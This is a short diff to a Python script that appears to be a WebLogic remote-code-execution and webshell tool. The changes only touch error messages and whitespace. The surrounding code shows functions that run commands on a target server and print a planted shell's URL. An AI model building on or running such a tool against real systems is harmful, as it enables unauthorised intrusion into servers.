@@ -66,6 +66,8 @@ def get_output(target,output_file):
         r = requests.get(output_url,headers = headers,proxies=proxies,timeout=timeout)
         if r.status_code == requests.codes.ok:
             return (True,(r.text.strip()))
+        elif r.status_code == 404:
+            return (False,'404 no output')
         else:
             return (False,r.status_code)
     except Exception,ex:
@@ -88,7 +90,7 @@ def weblogic_rce(target,cmd,output_file):
             #time.sleep(1)
             return get_output(target,output_file)
         elif r.status_code == 404:
-            return (False,'404 not vul')
+            return (False,'404 no vulnerability')
         else:
             return (False,'{} exist vul but something went wrong'.format(r.status_code))
     except requests.exceptions.ReadTimeout:
@@ -107,7 +109,6 @@ def weblogic_getshell(target,output_file,shell_file):
         if status:
             print '[+]shell-> http://{}/bea_wls_internal/{}'.format(target,output_file)
         return (status,result)
-
 '''
 main
 '''
